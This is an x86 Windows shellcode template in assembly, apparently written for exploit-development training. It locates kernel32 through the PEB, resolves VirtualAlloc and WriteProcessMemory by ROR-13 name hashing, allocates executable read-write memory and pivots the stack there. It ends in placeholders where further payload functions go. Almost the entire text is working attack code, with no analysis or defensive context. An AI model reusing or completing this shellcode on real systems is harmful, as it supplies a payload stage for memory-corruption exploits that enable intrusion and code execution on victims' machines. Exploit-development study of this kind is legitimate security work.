start:                      
  ; int3                          ; Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
  mov ebp, esp                    ; move the esp to ebp, to create space we're going to substract from the esp, to create space
  add esp, 0xfffff9c0             ; (*we will need 1600 space for a nop sled now) sub 1600 (python3 ./hex-convert.py -i -1600)

find_kernel32:               
  xor ecx, ecx                    ; ECX = 0
  mov esi, fs:[ecx + 0x30]        ; ESI = &(PEB) ([FS:0x30])
  mov esi, [esi + 0x0C]           ; ESI = PEB->Ldr
  mov esi, [esi + 0x1C]           ; ESI = PEB->Ldr.InInitOrder

next_module:                 
  mov ebx, [esi + 0x08]           ; EBX = InInitOrder[X].base_address
  mov edi, [esi + 0x20]           ; EDI = InInitOrder[X].module_name
  mov esi, [esi]                  ; ESI = InInitOrder[X].flink (next)
  cmp [edi + 12 * 2], cx          ; (unicode) modulename[12] == 0x00 ?
  jne next_module                 ; No: try next module.

not_used_label:                   ;
  jmp find_function_ret_addr      ; Jump short, this will not generate null bytes

find_function_ret:                ; jump label to be able to jump over this part, and code without null bytes
  pop esi                         ; get esi as pointer
  mov [ebp + 0x04], esi           ; Save the return pointer from the call instruction
  jmp resolve_symbols_kernel32    ; Jump short, RIP = RIP + 8-bit displacement sign extended to 64-bits.

find_function_ret_addr:
  call find_function_ret

find_function:
  pushad                          ; Save all registers
  mov eax, [ebx + 0x3c]           ; Offset to PE Signature
  mov edi, [ebx + eax + 0x78]     ; Export Table Directory RVA
  add edi, ebx                    ; Export Table Directory VMA
  mov ecx, [edi + 0x18]           ; NumberOfNames
  mov eax, [edi + 0x20]           ; AddressOfNames RVA
  add eax, ebx                    ; AddressOfNames VMA
  mov [ebp - 4], eax              ; Save AddressOfNames VMA for later

find_function_loop:          
  jecxz find_function_finished    ; Jump to the end if ECX is 0
  dec ecx                         ; Decrement our names counter
  mov eax, [ebp - 4]              ; Restore AddressOfNames VMA
  mov esi, [eax + ecx * 4]        ; Get the RVA of the symbol name
  add esi, ebx                    ; Set ESI to the VMA of the current symbol name

compute_hash:                
  xor eax, eax                    ; NULL EAX
  cdq                             ; NULL EDX
  cld                             ; Clear direction

compute_hash_again:          
  lodsb                           ; Load the next byte from esi into al
  test al, al                     ; Check for NULL terminator
  jz compute_hash_finished        ; If the ZF is set, we've hit the NULL term
  ror edx, 0x0d                   ; Rotate edx 13 bits to the right
  add edx, eax                    ; Add the new byte to the accumulator
  jmp compute_hash_again          ; Next iteration

compute_hash_finished:

find_function_compare:
  cmp edx, [esp + 0x24]           ; Compare the computed hash with the requested hash
  jnz find_function_loop          ; If it doesn't match go back to find_function_loop
  mov edx, [edi + 0x24]           ; AddressOfNameOrdinals RVA
  add edx, ebx                    ; AddressOfNameOrdinals VMA
  mov cx,  [edx + 2 * ecx]        ; Extrapolate the function's ordinal
  mov edx, [edi + 0x1c]           ; AddressOfFunctions RVA
  add edx, ebx                    ; AddressOfFunctions VMA
  mov eax, [edx + 4 * ecx]        ; Get the function RVA
  add eax, ebx                    ; Get the function VMA
  mov [esp + 0x1c], eax           ; Overwrite stack version of eax from pushad

find_function_finished:
  popad                           ; Restore registers
  ret                             ;  

resolve_symbols_kernel32: 
                                  ; PS C:\Users\deadbeef\github\OSED\scripts\share-offsec\scripts\custom-shellcode> python .\determen_hash.py VirtualAlloc 0x91afca54
  push 0x91afca54                 ; VirtualAlloc hash
  call dword ptr [ebp + 0x04]     ; Call find_function
  mov [ebp + 0x14], eax           ; Save the address for later usage
  
                                  ; python C:\Users\deadbeef\github\OSED\scripts\share-offsec\scripts\custom-shellcode\.\determen_hash.py WriteProcessMemory
  push 0xd83d6aa1
  call dword ptr [ebp + 0x04]     ; Call find_function
  mov [ebp + 0x18], eax           ; Save the address for later usage


  
  push 0x40                       ; PAGE_EXECUTE_READWRITE
  ; push 0x80                       ; PAGE_EXECUTE_WRITECOPY
  push 0x1000                     ; MEM_COMMIT
  push 0x8000                     ; length of the chain...
  push 0x0                        ; NULL - Let system decide where to allocate
  call dword ptr [ebp + 0x14]     ; call the VirtualAlloc function
  add eax, 0x1500                 ; add some offset to be sure the distence is not the problem
  mov [ebp + 0x1c], eax           ; Save the address for later usage
  
  push 0x40                       ; PAGE_EXECUTE_READWRITE
  push 0x1000                     ; MEM_COMMIT
  push 0x8000                     ; length of the chain...
  push 0x0                        ; NULL - Let system decide where to allocate
  call dword ptr [ebp + 0x14]     ; call the VirtualAlloc function
  add eax, 0x1500                    ; add 100 so to be sure stubs can reserve some memory when calling it.

  mov ecx, ebp                    ; Save the ebp (old) to ecx, for later use
  call get_eip                    ; Calls the label 'get_eip', pushing the address of the next instruction onto the stack
  jmp continue                    ; Jumps to the 'continue' label to resume execution

get_eip:
  pop ebx                         ; Pops the return address (value of EIP at the 'call') into the EBX register
  add ebx, 8                      ; add 8 for instr length
  ; jmp start_after_get_eip         ; Jumps back to the instruction after the 'call'
  jmp continue         ; Jumps back to the instruction after the 'call'

start_after_get_eip:
continue:
  mov esp, eax                    ; Set the eax (retval of VirtualAlloc) as the new esp.
  ; add esp, 100
  sub ebx, start_after_get_eip    ; substract the function start_after_get_eip
  mov edi, ebx                    ; move ebx (the current eip pointer to the stack) 
  mov ebp, esp                    ; set the ebp equals to esp, esp is not referenceable, ebp is.
  
  EBP_OFFSET_CALL_FUNCTION
  
  ; int3
  ret

FUNCTIONS_TO_REPLACE
